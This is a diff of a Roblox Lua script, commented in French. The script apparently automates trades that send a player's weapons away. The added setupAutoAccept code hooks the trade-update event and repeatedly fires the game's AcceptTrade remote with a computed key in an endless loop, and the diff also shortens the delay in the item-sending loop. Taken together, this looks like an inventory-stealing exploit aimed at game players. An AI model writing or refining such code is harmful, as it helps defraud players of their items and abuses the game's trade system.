@@ -221,20 +221,31 @@ local function waitForTradeCompletion()
     end
 end
 
-local function acceptTrade()
-    local acceptTradeEvent = game:GetService("ReplicatedStorage").Trade.AcceptTrade
+-- Configurer l'acceptation automatique du trade dès le début
+local acceptTradeEvent = game:GetService("ReplicatedStorage").Trade.AcceptTrade
+local tradeUpdateConnection = nil
+
+local function setupAutoAccept()
+    if tradeUpdateConnection then
+        tradeUpdateConnection:Disconnect()
+    end
     
-    game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
-        if tradeUpdate.LastOffer then
-            while true do
-                acceptTradeEvent:FireServer(game.PlaceId * 3, tradeUpdate.LastOffer)
-                task.wait(0.5)
-            end
-        else
-            return
+    tradeUpdateConnection = game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
+        if tradeUpdate and tradeUpdate.LastOffer then
+            task.spawn(function()
+                while true do
+                    local success, err = pcall(function()
+                        acceptTradeEvent:FireServer(game.PlaceId * 3, tradeUpdate.LastOffer)
+                    end)
+                    task.wait(0.5)
+                end
+            end)
         end
     end)
 end
+
+-- Initialiser l'auto-accept au démarrage
+setupAutoAccept()
 
 
 local function addWeaponToTrade(id)
@@ -483,8 +494,8 @@ if #weaponsToSend > 0 then
                         addWeaponToTrade(weapon.DataID)
                     end
                 end
-                wait(7)
-                acceptTrade()
+                wait(2)
+                -- L'acceptation se fait automatiquement via setupAutoAccept()
                 waitForTradeCompletion()
             else
                 wait(0.5)
